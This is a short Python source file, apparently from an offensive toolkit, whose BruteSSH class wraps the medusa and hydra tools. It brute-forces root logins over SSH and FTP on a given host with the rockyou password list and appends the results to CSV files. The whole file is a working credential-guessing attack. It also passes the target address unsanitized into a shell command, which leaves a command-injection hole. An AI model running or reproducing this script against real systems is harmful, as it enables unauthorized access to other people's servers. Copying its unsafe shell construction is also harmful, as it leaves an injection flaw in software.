# LOCAL
from File_man import File_Man

# SYS_BASE
import subprocess


class BruteSSH():
    def __init__(self, **kw):
        super(BruteSSH, self).__init__(**kw)
        self.FM         = File_Man()


    def go_medusa(self, host_ip, file_dir):
        try:
            print("[RUNNING_]:[MEDUSA]:[THREAD]")
            to_bash = f"medusa -h {host_ip} -u root -P /usr/share/wordlists/rockyou.txt -M ssh -n 22 "
            hydra_ret = subprocess.getoutput(to_bash)
            self.FM.write_file(file_dir+"/medusa_.csv", hydra_ret, "\n", "a+")
        except Exception as e:
            print(f"[E]:[GO_HYDRA]:[>{str(e)}<]")



    def go_hydra(self, host_ip, file_dir):
        try:
            print("[RUNNING_]:[HYDRA]:[THREAD]")
            to_bash = f"hydra -l root -P  /usr/share/wordlists/rockyou.txt ftp://{host_ip}"
            hydra_ret = subprocess.getoutput(to_bash)
            self.FM.write_file(file_dir+"/hydra_.csv", hydra_ret, "\n", "a+")
        except Exception as e:
            print(f"[E]:[GO_HYDRA]:[>{str(e)}<]")


